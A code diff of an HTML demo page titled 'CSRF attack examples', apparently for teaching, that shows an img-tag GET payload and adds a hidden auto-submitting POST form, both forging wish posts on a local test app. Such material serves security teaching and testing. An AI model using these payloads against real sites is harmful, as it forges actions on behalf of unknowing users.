@@ -62,18 +62,43 @@
 
     <div class="container">
       <!-- Example row of columns -->
-      <div class="row">
-        <div class="">
-          <h2>Simplest, with an img tag</h2>
-            <p>
-                This method consists in inserting an img tag (for example) that makes a GET request with some parameters:
-            </p>
-            <pre>&lt;img src="http://last-wishes.local/wish/add?email=csrf-attacker%40domain.com&content=message+posted+unintentionally" /&gt;</pre>
-            <p><a class="btn btn-default" href="/csrf-with-image.html" role="button">Go to example</a></p>
+        <div class="row">
+            <div class="">
+                <h2>Simplest, with an img tag</h2>
+                <p>
+                    This method consists in inserting an img tag (for example) that makes a GET request with some parameters:
+                </p>
+                <pre>&lt;img src="http://last-wishes.local/wish/add?email=csrf-attacker%40domain.com&content=message+posted+unintentionally" /&gt;</pre>
+                <p><a class="btn btn-default" href="/csrf-with-image.html" role="button">Go to example</a></p>
+            </div>
         </div>
-      </div>
 
-      <hr>
+        <div class="row">
+            <div class="">
+                <h2>With a form and some JS</h2>
+                <p>
+                    This writes a hidden form in the page and then submit it with JS:
+                </p>
+            <pre>
+    &lt;iframe name=&quot;form-destiny&quot; style=&quot;width:100%; height:300px;&quot;&gt;&lt;/iframe&gt;
+
+    &lt;form id=&quot;csrf-attacker-form&quot; method=&quot;POST&quot; action=&quot;http://last-wishes.local/wish/add&quot; target=&quot;form-destiny&quot;&gt;
+        &lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;csrf-attacker@mail.com&quot; /&gt;
+        &lt;input type=&quot;hidden&quot; name=&quot;content&quot; value=&quot;Fake message...&quot; /&gt;
+    &lt;/form&gt;
+
+    &lt;script&gt;
+        $(function()
+        {
+            $(&apos;#csrf-attacker-form&apos;).submit();
+        });
+    &lt;/script&gt;
+            </pre>
+                <p><a class="btn btn-default" href="/csrf-with-form.html" role="button">Go to example</a></p>
+            </div>
+        </div>
+
+        <hr>
 
       <footer>
         <p>CSRF attack examples</p>
